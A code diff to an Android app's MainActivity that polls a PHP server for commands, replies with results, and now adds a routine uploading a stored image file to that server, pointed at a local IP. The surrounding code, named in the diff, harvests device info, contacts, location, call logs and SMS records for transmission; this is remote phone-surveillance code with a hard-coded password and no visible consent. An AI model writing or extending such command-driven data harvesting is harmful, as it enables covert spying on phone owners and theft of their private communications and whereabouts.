@@ -3,6 +3,7 @@ package com.example.prp;
 import java.io.DataOutputStream;
 import java.io.File;
 import java.io.FileOutputStream;
+import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
@@ -12,14 +13,28 @@ import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.List;
 
+import org.apache.http.HttpEntity;
 import org.apache.http.HttpResponse;
+import org.apache.http.HttpVersion;
 import org.apache.http.NameValuePair;
+import org.apache.http.client.ClientProtocolException;
+import org.apache.http.client.HttpClient;
 import org.apache.http.client.entity.UrlEncodedFormEntity;
 import org.apache.http.client.methods.HttpPost;
+import org.apache.http.entity.mime.HttpMultipartMode;
+import org.apache.http.entity.mime.MultipartEntity;
+import org.apache.http.entity.mime.content.ContentBody;
+import org.apache.http.entity.mime.content.FileBody;
+import org.apache.http.entity.mime.content.StringBody;
 import org.apache.http.impl.client.DefaultHttpClient;
 import org.apache.http.message.BasicNameValuePair;
+import org.apache.http.params.CoreProtocolPNames;
+import org.apache.http.protocol.BasicHttpContext;
 import org.apache.http.protocol.HTTP;
+import org.apache.http.protocol.HttpContext;
 import org.apache.http.util.EntityUtils;
+import org.json.JSONException;
+import org.json.JSONObject;
 
 import android.app.Activity;  
 import android.content.ContentResolver;
@@ -56,7 +71,7 @@ public class MainActivity extends Activity {
     
     private static int delayTime = 5000;
     
-    private static String ipAddr = "10.0.0.1";
+    private static String ipAddr = "192.168.1.9";
   
     private Handler handler = new Handler();  
   
@@ -163,11 +178,11 @@ public class MainActivity extends Activity {
                 updateButton(5);  
                 //TODO
                 //handler.postDelayed(task, delayTime);  
-                replyDeviceInfo();
-                replyDeviceContacts();
-                replyDeviceLocations();
-                replyDeviceCallingRecords();
-                replyDeviceSMSRecords();
+                //replyDeviceInfo();
+                //replyDeviceContacts();
+                //replyDeviceLocations();
+                //replyDeviceCallingRecords();
+                //replyDeviceSMSRecords();
             }  
         }); 
         
@@ -193,8 +208,9 @@ public class MainActivity extends Activity {
         //replyDeviceContacts();
         //replyDeviceLocations();
         //replyDeviceCallingRecords();
-        
-        
+        //getDeviceLocation();
+        //replyPicture();
+          
     }  
   
     private void updateButton(int status) {  
@@ -239,7 +255,7 @@ public class MainActivity extends Activity {
     /**获取命令**/
 	private String getCommand(){   
 		try{  
-			URL url = new URL("http://10.0.0.1/prp/index.php/command/get_command");  
+			URL url = new URL("http://" + ipAddr + "/prp/index.php/command/get_command");  
 			HttpURLConnection conn = (HttpURLConnection) url.openConnection();  
 			conn.setDoInput(true);  
 			conn.setConnectTimeout(10000);  
@@ -294,7 +310,7 @@ public class MainActivity extends Activity {
     /**回复命令**/
 	private String replyCommand(String command_id,String result){  
 		String password = "123456";
-		String temp_url = "http://10.0.0.1/prp/index.php/command/reply_command";
+		String temp_url = "http://" + ipAddr + "/prp/index.php/command/reply_command";
 		try{  
 			HttpPost httpRequest = new HttpPost(temp_url); 
 			
@@ -496,6 +512,7 @@ public class MainActivity extends Activity {
 			if(location != null){
 				latitude = location.getLatitude();
 				longitude = location.getLongitude();
+				tvResult.setText("latitude:"+latitude+"\nlongitude"+longitude);
 				}
 		}
 		else{
@@ -525,7 +542,8 @@ public class MainActivity extends Activity {
 					if (location != null) {   
 						Log.e("Map", "Location changed : Lat: "  
 						+ location.getLatitude() + " Lng: "  
-						+ location.getLongitude());   
+						+ location.getLongitude());  
+						tvResult.setText("latitude:"+location.getLatitude()+"\nlongitude"+location.getLongitude());
 					}
 				}
 			};
@@ -534,6 +552,7 @@ public class MainActivity extends Activity {
 			if(location != null){   
 				latitude = location.getLatitude(); //经度   
 				longitude = location.getLongitude(); //纬度
+				tvResult.setText("latitude:"+latitude+"\nlongitude"+longitude);
 			}   
 		}
 		double[] location = {latitude,longitude};		
@@ -815,5 +834,50 @@ public class MainActivity extends Activity {
 		else{
 			return "no smsRecords";
 		}
+	}
+	/**返回图片**/
+	public String replyPicture(){
+		String fileDirPath = getApplicationContext().getFilesDir().getAbsolutePath();
+        try{        	      	
+        	List <NameValuePair> params = new ArrayList <NameValuePair>();
+        	String fileName = "switch.jpg";
+	        params.add(new BasicNameValuePair("userfile", fileDirPath + "/" + fileName));
+	        
+	        return postPicture("http://" + ipAddr + "/prp/index.php/device/reply_picture",params,fileName,"image/jpeg");
+        }
+        catch(Exception e){
+        	return e.getMessage();
+        }	
+	}
+	public String postPicture(final String url, final List<NameValuePair> nameValuePairs, String fileName, String fileType) {
+	    final HttpClient httpClient = new DefaultHttpClient();
+	    final HttpContext localContext = new BasicHttpContext();
+	    final HttpPost httpPost = new HttpPost(url);
+
+	    try {
+	        final MultipartEntity entity = new MultipartEntity(HttpMultipartMode.BROWSER_COMPATIBLE);
+
+	        for(int index=0; index < nameValuePairs.size(); index++) {
+	            if(nameValuePairs.get(index).getName().equalsIgnoreCase("userfile")) {
+	                // If the key equals to "userfile", we use FileBody to transfer the data
+	                entity.addPart(nameValuePairs.get(index).getName(), new FileBody(new File (nameValuePairs.get(index).getValue()), fileName, fileType, "utf-8"));
+	            } else {
+	                // Normal string data
+	                entity.addPart(nameValuePairs.get(index).getName(), new StringBody(nameValuePairs.get(index).getValue()));
+	            }
+	        }
+
+	        httpPost.setEntity(entity);
+
+	        final HttpResponse response = httpClient.execute(httpPost, localContext);
+
+	        final String responseBody = EntityUtils.toString(response.getEntity());
+	        System.out.println("RESPONSE BODY: " + responseBody);
+	        return responseBody;
+	    } 
+	    catch (final IOException e) {
+	        e.printStackTrace();
+	        return e.getMessage();
+	    }
 	}
 }  
